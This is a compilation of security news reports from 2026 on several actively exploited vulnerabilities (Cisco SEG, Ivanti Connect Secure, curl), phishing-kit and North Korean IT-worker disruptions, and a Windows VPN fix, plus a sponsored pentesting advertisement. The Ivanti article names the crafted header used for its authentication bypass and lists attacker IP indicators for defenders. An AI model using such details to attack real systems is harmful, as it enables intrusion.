m7soqt.text: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges. Tracked as CVE-2026-76519, this vulnerability stems from a relative path traversal weakness in SEG's Advanced Malware Protection (AMP) feature, caused by improper handling of email attachments. Threat actors can exploit this issue by sending an email with a maliciously crafted attachment through an unpatched device. "A successful exploit could allow the attacker to write arbitrary files and execute commands with root privileges on the underlying operating system," Cisco said in a Wednesday advisory. "In October 2026, the Cisco PSIRT became aware of active exploitation of this vulnerability." CVE-2026-76519 affects SEG instances where the File Reputation service is enabled and assigned to a mail policy, and the Content Scanner Tools version is earlier than 25.3.0.5525. To determine whether a specific device is vulnerable, admins have to use the contentscannerstatus CLI command to check what version of Content Scanner Tools is running and inspect the "Enable File Reputation" checkbox under Mail Policies > Incoming Mail Policies > Advanced Malware Protection or Mail Policies > Outgoing Mail Policies > Advanced Malware Protection in the web-based management interface. While the company didn't share further details about attacks exploiting the CVE-2026-76519 flaw, it shared the indicators of compromise (IOCs) in the table embedded below. Log Message Recommended Action System Security: Suspected compromise indicator was found. Contact TAC for further recommendations. Compromise detected. Follow the instructions in the Recommendations section of this Security Advisory System Security: Security scan did not complete. Contact TAC for further recommendations. Contact the Cisco Technical Assistance Center (TAC) for further support. System Security: No compromise indicator was found. No compromise detected. Upgrade to a fixed software release if applicable Cisco also warned customers to cross-check firewall and network logs for signs of suspicious activity (including downloads and uploads to and from external or suspicious IP addresses) because attackers may remove evidence of exploitation after gaining root-level command execution on vulnerable systems. The company added that it has already deployed mitigations on cloud instances and contacted Cisco Secure Email Cloud device owners where it found evidence of a potential compromise. "Cisco strongly recommends that customers who have been contacted restore a device to a secure configuration by renewing credentials and any cryptographic materials that are installed on the appliance, when possible. In addition, Cisco strongly recommends restricting access to the appliance and implementing robust access control mechanisms," it said. Internet security watchdog Shadowserver tracks nearly 300 Cisco Secure Email Gateway instances exposed online, but it provides no information on how many are honeypots or have already been secured. Cisco Secure Email Gateway hosts exposed online (Shadowserver) Cisco addressed another critical SEG vulnerability (CVE-2024-20401) in July 2024 that lets attackers add new users with root privileges or permanently crash appliances using emails with malicious attachments. In January, the company patched a maximum-severity Cisco AsyncOS flaw (CVE-2025-20393) that attackers have exploited in zero-day attacks targeting SEG and Secure Email and Web Manager (SEWM) appliances since November 2025. More recently, last month, Cisco warned customers to patch a new actively exploited SEG zero-day (CVE-2026-76461) in the email parsing of Cisco AsyncOS Software that also lets unauthenticated, remote attackers execute arbitrary commands with root privileges on the underlying OS. Since November 2021, the Cybersecurity and Infrastructure Security Agency (CISA) has added 100 Cisco vulnerabilities to its catalog of actively exploited flaws, seven of which have been abused in ransomware attacks. ntellg.text: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System. "Since January 2026, the threat actors behind these kits have been responsible for facilitating the sending of over one billion phishing emails and SMS messages to over 75 thousand organizations worldwide," the Microsoft Threat Intelligence and Microsoft Digital Crimes Unit said. The court-authorized operation is the result of an investigation that Microsoft launched in late 2025 after it was notified of malicious messaging campaigns targeting people in Japan. The The Chinese-language cybercriminal ecosystem has been described as an interconnected network of phishing kit operators, developers, and an illicit marketplace and initial access broker (IAB) codenamed YAM Store that peddles tools and infrastructure using compromised or fraudulently obtained Microsoft or Google environments for large-scale phishing attacks. Microsoft is tracking the underground marketplace as Storm-3119 and the developers behind all three phishing kits as Storm-2990. Evidence indicates that the three kits overlap in capabilities and infrastructure, suggesting shared development origins, code reuse, or close collaboration among their Chinese-speaking developers. As is the case with any phishing-as-a-service (PhaaS or PaaS) platform, the end goal is to provide phishing templates impersonating legitimate brands and organizations spanning government, financial, and logistics sectors worldwide, and enable high-volume phishing and credential stealing operations. "These messages have been used to target consumers, healthcare organizations, financial institutions, and other businesses in more than 150 countries, generating tens of millions of dollars for their operators," Health-ISAC said. Threat actors are said to have purchased these phishing kits, along with access to compromised or fraudulent Microsoft or Google cloud environments, to target organizations across the healthcare, financial services, wholesale distribution, and information technology (IT) sectors in Japan, the U.S., Australia, and India. "These phishing kits have been advertised through YAM Store, first CoGUI and Haozi, followed by Iron Man System starting in June 2026," Microsoft said. "YAM Store and affiliated phishing kit companies accepted payments through cryptocurrency, including USDT and Ethereum, adding another layer to conceal illicit activity." YAM Store also occupies a central place in the operations, as it advertises legitimate infrastructure associated with legitimate, expired, or previously used organizations that other cybercriminals can purchase to attack their targets. Some of the notable aspects of Storm-3119's tradecraft are listed below - Use of automation to identify expired environment or organization names, profile cloud-enabled organizations, and discover Microsoft 365 tenants. The reconnaissance phase occurs anonymously through Tor infrastructure. Take over viable environments and manage them using app-only administrative panels implemented in PHP, Java/Spring, and Cloudflare Workers. Establish presence within the compromised tenant, grant itself broad Microsoft Graph permissions and full control over the SharePoint API, and abuse the tenant's SharePoint and OneDrive as bulk hosting and turn the hijacked storage into a sellable product. Maintain dedicated infrastructure to support and oversee phishing operations on behalf of their customers. Resell hijacked accounts, licenses, and storage through an automated storefront. Sell phishing kits tracked as Storm-2990 to facilitate theft of sign-in credentials and financial data. CoGUI, as detailed by Proofpoint in May 2025, has been observed targeting Japanese organizations by impersonating well-known consumer and finance brands such as Amazon, PayPay, MyJCB, Apple, Orico, and Rakuten. The kit is said to have been used in real-world campaigns since at least October 2024. The phishing kit, per the enterprise security company, has also spawned two closely related variants named CoAceV and CoFish_Ws. In total, around 17,000 unique domains have been used by the three kits. By mid-2026, CoGUI was being increasingly replaced by Iron Man System, according to TRM Labs. The Iron Man System features more than 2,335 phishing templates that are tailored to impersonate trusted brands and organizations across 139 countries, including Australia, Japan, India, and the U.S., while taking steps to restrict access to phishing content to only users from specific countries. Resecurity, which purchased a license and deployed the kit in an isolated lab, said it supports 2,360 distinct phishing lure packages impersonating postal, tax, banking, telecom and loyalty-programme brands across 130 countries and regions. It also said it located a self-hosted Git and container-registry server containing 911 builds for the admin panel from October 2025 through June 2026. The cybersecurity company also found that the kit requires regular contact with the vendor's licensing server to function, "a dependency that favors defenders, since disabling or sinkholing the authorization host would degrade every active deployment, not just the one under investigation." Other advanced evasion techniques employed by the kits include fake CAPTCHA gates to filter out automated browsing sessions, IP-based block list and allow list, and Telegram-based alerts that notify the kit operator when a victim acts on a phishing lure. The sensitive information entered on the phishing site is captured using a WebSocket, allowing the operators to monitor their progress in real-time and decide what their targets see next. The stolen financial information is used by downstream actors to make fraudulent purchases of high-end goods or fraudulent transactions on legitimate financial platforms. "What began with scam activity targeting people and organizations in Japan led investigators to an underground service economy supplying criminals around the world," Steven Masada, associate general counsel and general manager of Microsoft's Digital Crimes Unit, said. "YAM Store, CoGUI and Iron Man are only part of that larger criminal network, but disrupting them makes it harder for criminals to obtain the accounts, tools and infrastructure they rely on. The scam message is often the only part victims see. The businesses behind it are what make it possible." The development comes less than a month after it announced the takedown of the EvilTokens device code phishing service that it said used artificial intelligence (AI) "at every step of the attack chain."

1t4ioeq.text: The U.S. Department of Justice (DoJ) on Tuesday charged 14 people and seized about 187 computers as part of its ongoing efforts to disrupt North Korea's fraudulent remote IT worker (ITW) scheme. The indictment charges a mix of U.S. citizens and Chinese nationals for their roles in an IT worker conspiracy affecting more than 70 U.S. companies, charging them with wire fraud conspiracy, money laundering conspiracy, conspiracy to commit identity theft, and aggravated identity theft. The following individuals have been charged - Sun Sheng Ming, 37, Dandong City, China Pei Li Guang, age unknown, Liaoning, China Weng Shou Cheng, age unknown, Liaoning, China Han Guo Bin, age unknown, Dandong City, China Wang Jian Jun, 34, Dandong City, China Sheng Zhang Kun, age unknown, Shenzhen, China Zhang Wei Ping, age unknown, Dandong City, China Zhang Li Ping, age unknown, unknown location Yu Yang, 40, age unknown, Dandong City, China Jin Long, 35, unknown location Michael James Bostelle, 31, Philadelphia, Pennsylvania Juan Cecilio Pena Carrillo, 37, San Juan, Texas The two U.S. nationals, Carrillo and Bostelle, have been arrested, while the rest remain at large. The fraudulent scheme was operational from around 2019 to July 2025. Another key U.S.-based co-conspirator, Trey Michael Nolte, has been named in the indictment but was not charged. Nolte is alleged to have managed a shell company called Dark Falls LLC that claimed to offer software development services, but was in fact used to perpetrate the criminal scheme. The operation also included the dismantling of more than 40 so-called laptop farms across Texas during raids that were conducted between September 21 and 25, 2026. "Threats posed by nation-states like North Korea are a stark reminder that our adversaries will go to great measures to exploit our nation's economic strength to further and fuel their own nefarious agendas," said U.S. Attorney David M. Toepfer for the Northern District of Ohio. Court documents allege that the defendants colluded to participate in a multi-year fraudulent scheme to land remote IT work to generate illicit revenue for the government of the Democratic People's Republic of Korea (DPRK), in violation of international sanctions and to fund its nuclear weapons and other military programs. The operation, also tracked as Famous Chollima, purpledelta, and Wagemole, revolves around North Korean IT workers getting hired at American and other companies using fake identities, drawing regular salaries, a chunk of which is funneled back to the regime. These workers are assisted by facilitators in the U.S. to help them get hired, host company-issued laptops at their residences, and leverage remote-access technology to make overseas workers appear to be legitimate U.S.-based employees. The U.S. facilitators are also responsible for setting up accounts at U.S. banks and online money transfer services to enable the movement of money paid by U.S. victim companies to the IT workers and other persons located abroad. In return for these services, the facilitators are paid a fee. In all, the scheme impacted more than 70 U.S. company employers and generated approximately $3 million in revenue for IT workers. "Victim entities included companies serving a broad array of industries and services including health care, communications, cyber support, retail, and manufacturing companies," the U.S. Department of Justice (DoJ) said. "Victim businesses were located not only in Ohio, but also across much of the U.S., including in Massachusetts, California, New York, New Jersey, Florida, Georgia, Minnesota, Maryland, North Carolina, Illinois, Virginia, Michigan, Texas, Arkansas, Pennsylvania, Washington, and the District of Columbia." The effort is the latest by the U.S. in a long-running and intensifying campaign that aims to cut off a revenue-generation source and dismantle an evolving cyber threat from North Korea whose scale is likely vast. Cybersecurity company CrowdStrike, which investigated indicators associated with suspected fake IT workers and identified links between apparently unrelated employees and laptop-hosting locations, said the threat actors have resorted to a variety of techniques to direct employer-provided hardware to laptop farm addresses during the onboarding phase. The operatives have been observed "filing fraudulent police reports claiming a laptop was stolen to trigger replacement shipments to farm addresses; they rotate through residential addresses to obscure the final destination," it said. "Others claimed last-minute relocations to divert devices mid-shipment. In some cases, operatives secured roles through IT staffing firms, which allowed end-client devices to be quietly redirected to farm infrastructure without the staffing firm's knowledge." Since at least May 2026, Famous Chollima is said to have begun spoofing device hashes, for example, mimicking a video capture card to appear as a webcam, likely in an effort to hide their use of these tools and to evade detection. "The laptop farm and its facilitators serve as a rented U.S. footprint: a physical address, a legal identity, and a mechanism to satisfy 'know your client' regulations, which are part of financial institutions' due diligence requirements," CrowdStrike said. "This disruption will likely slow Famous Chollima's operations only in the immediate areas where the laptop farms were shut down and is unlikely to create long-lasting effects. The adversary will almost certainly continue to evolve their methods to evade law enforcement discovery and disruption." An Ever-Evolving Threat In tandem, the U.S. Federal Bureau of Investigation (FBI) has issued an alert, detailing the operation's expanded use of facilitators, in some cases subcontracting entire jobs to foreign nationals in South Asia or West Africa. "Increasingly, North Koreans are obtaining jobs with Western companies and then hiring freelancers to complete work assignments for a fraction of the total salary," the FBI said. "ITWs subcontract employment-related remote labor to third-party freelancers, usually in Pakistan, India, Nigeria, or neighboring countries." The IT workers have also been found hiring South Asian or West African freelancers to assist with applying to jobs and with getting hired. These freelancers are paid to apply manually to as many open positions as possible over a specific timeframe or conduct interviews on their behalf. In addition, the Pyongyang-backed threat actors are alleged to use facilitators' identities without permission to apply for more jobs than agreed to and target economically vulnerable Americans to offer them facilitator gigs. "ITWs routinely invent elaborate stories, create fake companies, and produce official documentation to lend credibility to their requests," the FBI pointed out. "Common ITW backstories include claiming to be Chinese or East Asian nationals in need of a temporary U.S. presence or claiming to be Eastern Europeans displaced by the ongoing Russia-Ukraine war." The FBI said it also identified cases where the threat actors have used threats of physical violence against former managers and their families to demand payments and coerce others to carry out actions that further the scheme, marking a newfound escalation of the threat. Besides using stolen identities to apply for jobs, the IT workers are known to falsely claim ownership of social media accounts, professional profiles, and online identities belonging to other individuals in the tech sector to lend a veneer of legitimacy to their applications. "North Korean ITWs attempt to use identities or facilitators with the qualifications to obtain a larger pool of jobs, including positions requiring U.S. government security clearances or unique technical skills," the FBI said. "ITWs target positions with cleared defense contractors and other companies involved in U.S. government contracts. ITWs target active-duty U.S. military members to host laptops."

u2jmm1.text: Microsoft has resolved a known issue that caused Always On VPN connection issues after installing the September 2026 Windows 11 security updates. The Always On VPN remote access solution replaced the legacy DirectAccess technology and works with domain-joined, non-domain-joined, and Microsoft Entra ID–joined Windows 10, Windows 11, and Windows Server devices. Always On VPN runs in the background and automatically establishes a secure tunnel back to the corporate network whenever a device connects to the internet. As Microsoft first acknowledged in a service alert sent to IT administrators in late September, the bug triggered Always On VPN failures if the initial connection fails (e.g., when using automatic protocol selection with IKEv2 and SSTP) on up-to-date systems running Windows 11 24H2 and later. On Tuesday, the company released the KB5127648 and KB5127646 cumulative updates that address this known issue on all affected systems. "When automatic protocol selection or protocol fallback was configured, affected VPN connections could remain stuck in a Connecting state or fail to connect after an initial connection attempt failed," it said. "In some cases, subsequent connection attempts could display the error, 'The specified port is already in use.'" Microsoft has also shared a temporary fix for customers who can't immediately install the October 2026 Patch Tuesday update, which requires them to choose one of two VPN tunneling protocols to work around the issue. "IT administrators can mitigate this issue by changing the Always On VPN profile from automatic protocol selection to a single protocol, either SSTP only or IKEv2 only, depending on their environment and configuration," Microsoft said. "Organizations should select the protocol based on their environment, security, and deployment requirements." Last month, it released emergency updates to fix Remote Desktop Services failures, Hyper-V issues, and USB audio problems affecting home and enterprise Windows users, which were also triggered by the September 2026 updates. This week, it also confirmed that non-admin users may have issues connecting to devices via Remote Desktop after installing recent Windows updates if the "Administrator protection" security feature is enabled. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat

gqgmus.text: By Sila Ozeren Hacioglu, Security Research Engineer at Picus Security. For years, security teams had a window of several weeks between a CVE going public and attackers exploiting it. Every year, that window got smaller. Then Mythos-class models arrived, and attackers can now weaponize a new CVE within hours. That leaves security teams very little time to find out whether they’re exposed. That’s where offensive testing comes in. But it has traditionally run on a schedule. Over the years, that schedule got tighter. Annual pentests became quarterly, and automated penetration testing tools made weekly testing possible. Each advancement shortened the time a change could go untested. Traditional automated pentesting worked fine back when exploitation took weeks. Now that attackers have made a big jump, offensive testing is making one too. That jump is agentic pentesting. It’s the sharp edge of offensive testing today, but it has blind spots. This piece looks at where they are and how to close them. How Agentic Pentesting Should Work A manual pentest usually goes through several phases: reconnaissance, vulnerability assessment, initial access, post-exploitation, and reporting. Traditional automated pentesting tools follow the same phases. Even before LLMs took off, some advanced tools used machine learning to choose the next step. For example, five years ago, we built our Attack Path Validation (APV) product with such a decision engine. But AI agents take it further. In agentic pentesting, one or more AI agents carry out a pentest step by step. In our agentic pentesting product, Picus Swarm uses five specialist agents orchestrated by Numi AI. AI pentest agents evaluate findings and your organization’s context to choose the next step dynamically. That creativity lets them find exploit chains much faster than a human pentester, including some a human might miss entirely. However, creativity comes at a cost. Running everything agentically uses a lot of tokens, and results vary from run to run. Even when nothing has changed in the environment, an agent can fail to exploit a vulnerability five times and succeed on the sixth. Running dozens of tests to be sure gets expensive, and in a large organization with thousands of endpoints, a single agentic run can take weeks. That’s why deterministic automated pentesting is still needed. It’s less creative, but it delivers consistent testing, costs less, and finishes faster, so it can run far more often. It follows repeatable steps, allowing teams to compare runs over time and reliably retest fixes. The right approach offers both. Run deterministic tests often for predictable coverage and agentic tests at set intervals. How often depends on your organization’s needs and risk appetite. Picus Autonomous Pentesting can run in either mode, fully agentic or deterministic, and adapts to your context, risks, and changes in the threat landscape and your environment. Agentic pentesting is valuable, and the need for it is real. But it has limits worth understanding. See What Your Pentesting Covers, and What It Doesn’t In most deployments, automated pentesting covers only one of six surfaces you need to validate. This whitepaper shows what stays untested, from detection rules to cloud, identity, and AI guardrails, why adding AI doesn’t lift that ceiling, and three questions that expose the gap. Read the Guide The Achilles’ Heel of Agentic Pentesting: Untestable Assets and Exposures Agentic pentesting’s biggest strength is also its limit. It tests by running real attacks, so it can only test what it can safely reach. Omdia research found that organizations pentest only 32% of their attack surface on average. Safety restrictions keep it off critical systems. A real exploit can crash a service, corrupt data, or trigger a failover. That’s why PCI and NIST guidance advises testers to avoid potentially disruptive exploits on fragile production systems. Reachability limits the rest. The agent can only test what it has a network path into, so segmented and air-gapped zones stay out of reach. We saw this in one customer environment. Their scanners flagged an nginx-ui authentication bypass (CVE-2026-33032) on 480 instances. Within the permitted scope, agentic pentesting could test only 120 of them. It confirmed that 80 were exploitable, while 40 were blocked. The other 360, three out of every four affected instances, were out of reach and received no verdict. The nginx-ui case covered a single CVE. Zoom out to all the CVEs in your environment, and a second gap appears. Even on assets an agentic pentesting tool can reach, many vulnerabilities can’t be tested because there’s no exploit to run. VulnCheck found that only about a quarter of 2025 CVEs had proof-of-concept (PoC) code or exploit details. It also found that 29% of the vulnerabilities it confirmed as exploited in 2025 were exploited on or before their CVE publication dates. With no public exploit to run, some teams ask an LLM to write one. However, an untested exploit might crash a service or corrupt data. So agentic pentesting leaves two gaps: the assets it never reaches, like those 360 instances, and the vulnerabilities it can’t test on the assets it does reach, often because there’s no exploit to run. Want the full technical breakdown? Download the whitepaper. How Exploitability Validation Covers All Your Assets and Exposures In the nginx-ui bypass case discussed above, agentic pentesting left 360 of the 480 affected instances without an answer. Exploitability validation, delivered by Picus Exposure Validation, doesn’t try to reach them with an exploit. It breaks the CVE down into the attacker behaviors required to exploit it and tests each behavior against your live security controls within hours. Because the verdict rests on control evidence rather than successful exploitation, a missing PoC is not treated as proof that an asset is safe. This addresses both gaps. Combined with asset context, that evidence gives the 360 untested instances a verdict: 260 blocked by controls and 100 likely exploitable. The 480 raw findings become 180 evidence-backed priorities: 80 confirmed exploitable through agentic pentesting and 100 assessed as likely exploitable through Exposure Validation. You know which hosts your controls already cover and which need a compensating control today. Three Methods Working Together to Validate Every CVE and Every Asset in Hours Running these methods as separate tools can produce siloed or duplicated findings and conflicting priorities. They need to feed one shared, evidence-backed, context-aware findings model, with one backlog and one result per exposure. The Picus Platform is built on that principle, with Autonomous Pentesting, Exposure Validation, and Breach and Attack Simulation working from shared evidence. When a critical CVE drops, Numi AI picks it up as a signal, and Picus Swarm's agents take it from there. Discovery. The CVE is enriched with threat intelligence and mapped to attacker techniques. Affected assets, their business criticality, and deployed controls are identified. Validation. Autonomous Pentesting tests in-scope assets, Breach and Attack Simulation tests controls, and Exposure Validation assesses every affected asset. Mobilization. Low-risk mitigations are deployed automatically. The rest are assigned to owners, and every fix is revalidated. The whole cycle runs in hours, not weeks. The Bottom Line Attackers with Mythos-class models can now weaponize a new CVE within hours. Agentic pentesting is the most powerful way to test like a real attacker, and when the same platform also supports deterministic tests, testing stays both creative and repeatable. But even together, these methods can only test what they can safely reach. Exposure Validation covers the rest. Together with Breach and Attack Simulation, the three capabilities work as one platform to validate every CVE on every asset in hours. Want to see it live? We’ll walk you through it. Request your free demo now. Sponsored and written by Picus Security.

mmjnb6.text: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday urged organizations to take steps to immediately update their Ivanti Connect Secure (ICS) appliances and deployments to the latest version following the disclosure of an actively exploited vulnerability. The security flaw, tracked as CVE-2026-104935 (CVSS score: 8.6), is a case of authentication bypass impacting ICS versions 25.1.1.1 and prior, 25.1.2.2 and prior, and 22.8R2.4 and prior that could allow a remote unauthenticated attacker to execute arbitrary commands. "CISA is aware of cyber threat actors exploiting this zero-day authentication bypass vulnerability, which allows remote, unauthenticated execution of arbitrary commands, to conduct credential theft and data exfiltration," the agency said. The agency has since added the flaw to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by October 16, 2026. CISA is also recommending that customers of affected ICS deployments review Ivanti's Connect Secure Upgrade and Migration Compatibility Guide for patching guidance, cautioning that version 22.8 reaches end-of-life on January 31, 2027. "Organizations seeking to determine whether they were compromised will need to conduct network and memory forensics to identify evidence of exploitation," it added. In the event a compromise is detected, CISA is advising organizations to implement the following actions - Create a backup of the appliance configuration. Conduct a factory reset and upgrade the appliance to the latest version. For cloud and virtual systems, rebuild the virtual instance and upgrade to the latest version. Restore the appliance configuration from the backup created in step 1. Reset passwords for all accounts, including domain, administrator, and local accounts. Revoke and reissue stored certificates; reset stored API keys and license server credentials. The development comes as Previdian disclosed that it has observed 105 exploitation attempts targeting its honeypot sensors as of October 14, 2026. The attack attempts have originated from 50 unique IP addresses geolocated to Singapore and the U.S. Some of the observed IP addresses are listed below - 216.73.160[.]59 216.73.160[.]61 216.73.160[.]210 45.8.19[.]111 According to Previdian founder and CEO, Ryan Dewhurst, threat actors are using the X-DSCGI-PATH header to reach an internal CGI handler and upload Perl scripts dressed up as ZIP files. The scripts return unique markers that determine whether remote code execution has succeeded. "We're seeing coordinated attempts to exploit this Ivanti vulnerability, but the payloads captured so far are primarily testing for code execution rather than deploying malware, or compromising the device," Dewhurst told The Hacker News. "However, full weaponized exploitation is likely to follow in the coming hours and days." In a separate report, Volexity said it first observed the exploitation of CVE-2026-104935 on October 3, 2026, with a previously undocumented threat actor dubbed UTA0576 leveraging it in conjunction with a privilege escalation vulnerability to achieve unauthenticated root-level code execution. UTA0576 is assessed to be driven by criminal motives rather than espionage. Following successful exploitation, the threat actor is said to have engaged in broad post-exploitation actions, including extracting credentials stored on the ICS VPN appliance, exfiltrating limited Active Directory metadata, deploying a Kerberos tool capable of Kerberoast attacks and credential testing, conducting host reconnaissance, LDAP packet capture, and dropping a Python LDAP tool to search for administrator passwords and BitLocker recovery keys. "The recovered payloads demonstrate deliberate efforts to conceal malicious activity through selective log modification, removal of temporary execution artifacts, and restoration of altered system state," Volexity researchers Charlie Gardner, Sean Koessel, and Steven Adair said. "UTA0576 deployed no malware or web shell. Instead, the threat actor re-exploited the device for every command it ran and tampered with logs to cover its tracks, evading Ivanti's Integrity Checker Tool." Threat intelligence company Defused Cyber has also confirmed active exploitation, stating its decoys "caught pre-disclosure exploitation we assess as CVE-2026-104935" in the wild starting October 1, 2026. "The root cause of the vulnerability is incredibly simple, with a single request containing a specially crafted 'X-DSCGI-PATH' header being all that is needed to bypass authentication and access sensitive functionality that otherwise should be restricted," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said. "Ivanti Connect Secure has long been a popular target for attackers, including ransomware gangs, and joins 14 other Ivanti Connect Secure / Pulse Connect Secure vulnerabilities on the CISA KEV list. Given the history, we expect exploitation to move incredibly quickly from targeted attacks to indiscriminate mass exploitation." It's essential that organizations running ICS patch immediately and investigate their appliances for signs of compromise, including identifying any inbound requests featuring an "X-DSCGI-PATH" header.

r737iu.text: A flaw in how curl handles HTTP/2 uploads lets a malicious server receiving an upload corrupt the client's memory, and the researcher who reported it turned that into code execution on the uploading machine. The curl project fixed it on October 14 in curl 8.23.0. Taking over a client needs exact knowledge of its build and memory layout, and curl expects a real attack to end in a crash instead. The flaw, a use-after-free tracked as CVE-2026-92392, affects curl and libcurl 8.12.0 through 8.22.0, both the command-line tool and the library that many other programs use for transfers. curl rates it High on its own four-level scale, its first High-severity flaw since the SOCKS5 heap overflow of October 2023.
